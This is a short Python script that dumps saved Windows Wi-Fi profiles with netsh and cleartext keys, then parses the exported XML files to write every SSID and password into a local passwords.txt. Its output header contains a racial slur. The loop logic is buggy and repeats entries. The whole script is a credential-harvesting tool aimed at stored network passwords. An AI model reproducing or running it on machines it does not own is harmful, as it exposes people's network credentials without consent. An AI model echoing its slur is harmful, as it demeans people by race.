import os
import subprocess
import sys

password_file = open('passwords.txt', "w")
password_file.write("Ayo nigga, this are the password you requested:\n\n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_passwords = []

command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"],
                         capture_output = True).stdout.decode()

path = os.getcwd()

for a in os.listdir(path):
    if a.startswith("Wi-Fi") and a.endswith(".xml"):
            wifi_files.append(a)
            for b in  wifi_files:
                with open(b, "r") as f:
                    for line in f.readlines():
                            if 'name' in line:
                                stripped = line.strip()
                                front = stripped[6:]
                                back = front[:-7]
                                wifi_name.append(back)
                            if 'keyMaterial' in line:
                                stripped = line.strip()
                                front = stripped[13:]
                                back = front[:-14]
                                wifi_passwords.append(back)
                                for x, y in zip(wifi_name, wifi_passwords):
                                    sys.stdout = open("passwords.txt", "a")
                                    print("SSID: " + x, "Password: " + y, sep="\n")
                                    sys.stdout.close()


